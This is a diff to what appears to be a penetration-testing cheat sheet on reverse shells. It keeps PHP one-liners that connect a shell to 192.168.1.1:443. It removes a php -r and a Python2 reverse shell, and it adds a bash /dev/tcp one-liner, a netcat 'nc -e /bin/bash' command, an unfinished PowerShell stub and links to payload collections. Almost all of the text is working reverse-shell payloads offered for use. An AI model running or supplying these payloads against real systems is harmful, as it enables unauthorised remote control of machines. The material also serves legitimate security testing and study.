@@ -20,14 +20,27 @@ PHP code for a simple web shell:
 PHP to immediately pop a shell
 <?php $sock=fsockopen("192.168.1.1",443); exec("/bin/sh -i <&3 >&3 2>&3");?>
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/443 0>&1'");?>
-
-> php -r '$sock=fsockopen("192.168.1.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
-
-Python2 code to immediately pop a shell
-> /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-###### Ready-to-go payloads
+###### Pop a shell from command line
+```
+Bash
+> bash -i >& /dev/tcp/192.168.1.1/443 0>&1
+
+Netcat
+> nc -e /bin/bash 192.168.1.1 443
+
+```
+
+///TODO
+PowerShell
+From a powershell environment:
+>
+From a cmd instance:
+>
+
+
+###### Ready-to-go reverse shell payloads
 ```
 Nishang
 https://github.com/samratashok/nishang
@@ -37,6 +50,9 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
 
 Pentestmonkey Cheatsheet
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+Shell Spawning with NetSec
+https://netsec.ws/?p=337
 ```
 
 ###### List msfvenom payload options
